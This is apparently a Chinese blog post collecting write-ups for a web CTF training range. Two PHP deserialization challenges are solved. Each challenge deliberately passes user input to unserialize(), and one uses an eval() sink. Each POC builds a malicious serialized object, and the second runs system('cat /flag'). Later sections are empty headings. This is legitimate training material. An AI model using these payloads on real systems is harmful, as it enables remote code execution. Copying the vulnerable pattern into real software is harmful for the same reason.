---
title: 青岑CTF Web入门 WP全集
description: 整理自青岑CTF靶场
date: 2026-06-24 14:48:23
updated: 2026-06-24 14:48:23
image: /2026/青岑CTF Web入门 WP全集/cover.jpg
categories: [CTF]
---

## EZPOP

```PHP
$flag = file_get_contents("/flag");
class ShowFlag {
	public $show = false;
	public function __destruct() {
		if ($this->show) {
			echo $GLOBALS['flag'];
		}
	}
}
highlight_file(FILE);
if (isset($_GET['data'])) {
	unserialize($_GET['data']);
}
?>
```

令`$this->show`为`true`即可。

POC 

```PHP
<?php
class ShowFlag {
    public $show = true;
}
echo urlencode(serialize(new ShowFlag()));
?>
```



## EZPOP_1

```PHP
<?php
class ShowFlag {
    public $show = false;
    public $code = "";
    public function __destruct() {
        if ($this->show) {
            eval($this->code);
        }
    }
}
if (isset($_COOKIE["data"])) {
    unserialize($_COOKIE["data"]);
}
highlight_file(__FILE__);
```

可以令`$this->show`为`true`，然后进入`eval($this->code)`，这时去改变`$this->code`的值进行命令执行。

POC

```PHP
<?php
class ShowFlag
{
    public $show = true;
    public $code = "system('cat /flag');";
}
echo serialize(new ShowFlag());
```



## EZPOP_2

## EZPOP_3

## EZPOP_4

## EZPOP_5

## EZPOP_6

## EZPOP_7

## EZPOP_8

